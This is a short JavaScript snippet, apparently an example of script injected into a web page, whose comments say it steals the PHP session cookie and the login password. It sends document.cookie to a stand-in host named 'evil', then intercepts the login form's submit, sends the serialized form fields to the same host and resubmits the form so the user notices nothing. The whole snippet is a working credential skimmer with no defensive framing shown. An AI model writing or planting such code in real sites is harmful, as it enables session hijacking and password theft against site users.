var img = [ new Image(), new Image(), new Image()  ];
img[0].src = 'https://tracker/hit.php';

// Steal the PHP session cookie
img[1].src = 'https://evil/?' + document.cookie;

// Steal the password at login
$('form').one('submit', function(e) {
    e.preventDefault();
    img[2].src = 'https://evil/?' + $('form').serialize();

    var form = $(this);
    setTimeout(function() {
        form.submit();
    }, 100);
});